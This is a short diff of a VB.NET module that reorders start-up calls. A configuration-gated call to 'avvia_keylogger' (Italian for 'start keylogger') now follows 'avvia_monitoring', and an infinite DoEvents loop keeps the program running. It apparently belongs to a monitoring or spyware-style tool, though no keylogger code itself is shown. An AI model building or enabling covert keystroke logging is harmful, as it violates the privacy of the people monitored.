@@ -59,10 +59,20 @@ Module Module1
         AddHandler aTimer.Elapsed, AddressOf tick
         aTimer.Start()
 
-
-        If c.keylogger Then avvia_keylogger()
-
+        
         avvia_monitoring()
+    
+    
+    
+        If c.keylogger Then
+            avvia_keylogger()
+        Else
+            While True 'no stop main
+                Application.DoEvents()
+            End While
+        End If
+
+        
         'avvia_process_monitoring()
 
 
